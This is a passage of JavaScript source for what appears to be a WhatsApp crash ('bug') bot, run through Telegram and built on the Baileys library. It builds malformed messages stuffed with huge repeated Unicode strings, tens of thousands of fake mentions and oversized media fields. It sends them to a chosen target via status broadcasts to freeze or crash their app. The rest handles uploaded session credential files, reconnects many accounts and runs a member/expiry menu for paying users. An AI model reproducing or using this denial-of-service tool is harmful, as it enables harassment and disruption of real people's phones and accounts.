        ],
         stanzaId: "1234567890ABCDEF",
         quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
           }
         }
       }
     }
   };
     
  await sock.relayMessage("status@broadcast", msg3, {
    statusJidList: [target],
    messageId: null,
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  
  const msg4 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg4, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  
  const msg6 = {
    videoMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7161-24/539058873_2120381162050747_6724837403035139229_n.enc?ccb=11-4&oh=01_Q5Aa2wESeBb4astr8DkdADVFjl2HZjfzb79aSC4HlIQNn3kdjQ&oe=69295BB3&_nc_sid=5e03e0&mms3=true",
       mimetype: "video/mp4",
       fileSha256: "jf+ox6CQigqy2UvLcWPCOvVvOyi49vdeIlqobw1688Y=",
       fileLength: 1554082,
       seconds: 15,
       mediaKey: "1e/M+nZlNcV1T10KojVjcuZDwHk+6M9ero0ajhG7Fms=",
       height: 816,
       width: 768,
       fileEncSha256: "FLjY8MiohQEpgsaYYWTEylEkKox/D13pqtm/ehN1ba8=",
       directPath: "/v/t62.7161-24/539058873_2120381162050747_6724837403035139229_n.enc?ccb=11-4&oh=01_Q5Aa2wESeBb4astr8DkdADVFjl2HZjfzb79aSC4HlIQNn3kdjQ&oe=69295BB3&_nc_sid=5e03e0",
       mediaKeyTimestamp: 1761726314,
         caption: "#delay kil you" + "ꦾ".repeat(2222),
            contextInfo: {
                statusAttributionType: 2,
                isForwarded: true,
                forwardingScore: 7202508,
                forwardedAiBotMessageInfo: {
                  botJid: "13135550002@bot",
                  botName: "Meta AI",
                  creatorName: ""
                },
                mentionedJid: Array.from(
                  { length: 1900 },
                  (_, z) => `1313555000${z + 1}@s.whatsapp.net`
                )
              },

              streamingSidecar:
                "ZCTXLaWRSUS57M2WDi5Rmxk1kq9Jm8uPJAtt0Qm2Pdxh3hRYFM3IOg==",
              thumbnailDirectPath:
                "/v/t62.36147-24/531652303_1341445584346193_3521117362172863397_n.enc?ccb=11-4&oh=01_Q5Aa2wEK08NNxekWOl2uTJONY8JpIjdWijZ8uBMRvlhIv7lFWw&oe=6926531E&_nc_sid=5e03e0",
              thumbnailSha256: "XFmelyVsc04pajE/UH7cqxRIbOT8FF2PPqnjo/jIdDg=",
              thumbnailEncSha256: "B4u4FhVwI1OC3DTOuSLxwv5NKTJ5s3YFfZ/oqrI8hpE=",

              annotations: [
                {
                  shouldSkipConfirmation: true,
                  embeddedContent: {
                    embeddedMusic: {
                      musicContentMediaId: "1328419335741957",
                      songId: "1221313878044460",
                      author: "vue.pdf",
                      title: "ꦾ".repeat(9000),
                      artworkDirectPath:
                        "/v/t62.76458-24/538001898_1721507205206204_1856297105077950312_n.enc?ccb=11-4&oh=01_Q5Aa2wG6vgDeEBNpBou9E_hlOwfQid9sttzm8sXIT_GL-MyJYQ&oe=692643CB&_nc_sid=5e03e0",
                      artworkSha256: "DQIz0Oj5q9X3DMmLIAEZ+0dGN0tVWWhKx7AMgOtuhCs=",
                      artworkEncSha256: "pzljQhAsS8uKKVvBHwYhjFhYXb2oz7Ha6io5qu7oBW4=",
                      artistAttribution: "https://xnxx.com",
                      countryBlocklist: "+62",
                      isExplicit: true,
                      artworkMediaKey: "+O9eJ1/zuS2GRYDWkHgK7nohkP5zRIMAEhnmObrU6E0="
                    }
                  },
                  embeddedAction: true
                  }
               ]
            }
         };
         
  await sock.relayMessage("status@broadcast", msg6, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  
  const msg7 = {
    documentMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
       mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
       fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
       fileLength: "999999999999",
       pageCount: 1316134911,
       fileLength: 9999999999,
       height: 999999999,
       mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
       fileName: "Rexcc" + "ꦾ".repeat(60000),
       fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
       directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
       mediaKeyTimestamp: "1743848703",
       jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
       streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
        thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
        thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
        thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
        artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
          artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
            artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
              artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
             },
             quotedMessage: {
                paymentInviteMessage: {
                   serviceTypoe: 3,
                   expiryTimeStamp: Date.now() + 18144000000,
               }
           }
       };
  
  await sock.relayMessage("status@broadcast", msg7, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  
   const msg10 = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

      await sock.relayMessage("status@broadcast", msg10, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    
    const msg11 = {
       extendedTextMessage: {
          text: "",
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "696969696969@s.whatsapp.net",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
            fromMe: false,
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Xrl ~ Fuckerr",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "review_and_pay",
                      paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"𝐑𝐞𝐥𝐥𝐲𝐆𝐨𝐝𝐬\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      };

      await sock.relayMessage("status@broadcast", msg11, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    
   const msg15 = {
      viewOnceMessage: {
         message: {
            interactiveMessage: {
               body: {
                  locationMessage: {
                    degressLatitude: -2,
                    degressLongitude: 2,
                    name: "\ubbbb".repeat(25000)
                  }
               },
               nativeFlowMessage: {
                  buttons: [
                    {
                      name: "galaxy_message",
                       buttonParamsJson: JSON.stringify({
                    display_text: "ꦽ".repeat(88000),
                    icon: "DEFAULT"
                  })
                },
                {
                  name: "cta_call",
                  buttonParamsJson: JSON.stringify({
                    call_loop: 3
                  })
                }
              ]
            },
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 3
            },
          expiredSecury: [{ userJid: target,
                           mentionedJid: target,
                           participant: target,
                           quoted: null
                        }],
                        messageContextInfo: {
                          deviceListMetadata: {},
                          deviceListMetadataVersion: 1,
                          deviceListMetadataType: "Sectural_private"
                        }          
                    }
                }
            }
        };
        
    await sock.relayMessage("status@broadcast", msg15, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    
  const msg19 = {
     viewOnceMessage: {
         message: {
             interactiveResponseMessage: {
                 body: {
                    text: "....",
                    format: "DEFAULT"
                 },
                 nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\x10".repeat(1045000),
                    version: 3
                 },
                entryPointConversionSource: "galaxy_message",
             }
         }
     },
     ephemeralExpiration: 0,
     forwardingScore: 9741,
     isForwarded: true,
     font: Math.floor(Math.random() * 99999999),
     background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
};
 
   await sock.relayMessage("status@broadcast", msg19, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
 }

//no share abangkuh


// ======================================= //
// WhatsApp Connect Logic
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Error preparing auth folders:", err.message);
    return [];
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        keepAliveIntervalMs: 50000,
        logger: pino({ level: "silent" }),
        auth: state,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        generateHighQualityLinkPreview: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        version
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            if (fs.existsSync(folderPath)) {
              fs.rmSync(folderPath, { recursive: true, force: true });
            }
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            if (fs.existsSync(folderPath)) {
              fs.rmSync(folderPath, { recursive: true, force: true });
            }
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
      return false;
  }
  const sessionDir = path.join('permenmd', owner, number); 

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd', { recursive: true });
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

try {
  await waiting(3000)
  if (fs.existsSync(sourceCreds)) {
    const data = fs.readFileSync(sourceCreds); // baca isi file sumber
    fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
    console.log(`✅ Rewrote session to ${destCreds}`);
  }
} catch (e) {
  console.error(`❌ Failed to rewrite creds: ${e.message}`);
}
    }
  });

  return null;
}

async function startUserSessions() {
  try {
    // Ensure base folder exists
    if (!fs.existsSync('permenmd')) {
      fs.mkdirSync('permenmd', { recursive: true });
    }

    // Ambil semua subfolder dalam permenmd
    const subfolders = fs.readdirSync('permenmd')
      .map(name => path.join('permenmd', name))
      .filter(p => {
        try {
          return fs.lstatSync(p).isDirectory();
        } catch (err) {
          return false;
        }
      });

    console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

    for (const folder of subfolders) {
      try {
        const jsonFiles = fs.readdirSync(folder)
          .filter(file => file.endsWith(".json"))
          .map(file => path.join(folder, file));

        console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

        for (const jsonFile of jsonFiles) {
          const sessionName = `${path.basename(jsonFile, ".json")}`;

          // ✅ Cek apakah session sudah aktif
          if (activeConnections[sessionName]) {
            console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
            continue;
          }

          try {
            console.log(`[START] Connecting session: ${sessionName}`);
            await connectSession(folder, sessionName);
          } catch (err) {
            console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
          }
        }
      } catch (err) {
        console.error(`Error processing folder ${folder}:`, err.message);
      }
    }
  } catch (err) {
    console.error("Error in startUserSessions:", err.message);
  }
}

// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  try {
    const folderPath = path.join('permenmd', subfolderName);
    if (!fs.existsSync(folderPath)) return null;

    const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
    for (const file of jsonFiles) {
      const sessionName = `${path.basename(file, ".json")}`;
      if (activeConnections[sessionName]) {
        return activeConnections[sessionName]; // return socket aktif
      }
    }
    return null; // Tidak ada sesi aktif
  } catch (err) {
    console.error("Error checking active session:", err.message);
    return null;
  }
}

const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [[
          { text: "📋 List User", callback_data: "list_user" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom" },
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
  await refreshUserSessions()
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
})

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  
  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  const onlineMess = connectedMess || [];
  const onlineBiz = connectedBiz || [];
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += onlineMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += onlineBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += onlineNumbers.length > 0
